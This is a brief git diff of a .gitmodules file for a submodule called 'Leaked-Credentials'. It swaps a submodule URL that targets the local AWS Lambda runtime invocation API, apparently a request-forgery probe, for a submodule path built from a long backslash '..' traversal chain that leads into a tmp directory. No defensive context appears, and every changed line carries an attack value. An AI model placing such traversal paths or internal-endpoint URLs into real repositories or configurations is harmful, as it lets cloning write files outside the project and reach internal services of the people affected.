@@ -1,3 +1,3 @@
 [submodule "Leaked-Credentials"]
-	path = Leaked-Credentials
-	url = http://localhost:9001/2018-06-01/runtime/invocation/next?
+	path = \..\..\..\..\..\..\..\..\..\..\..\..\..\tmp\aaaaaaaaaaaaaaaaa
+	url = https://github.com/h4x0r-dz/Leaked-Credentials.git
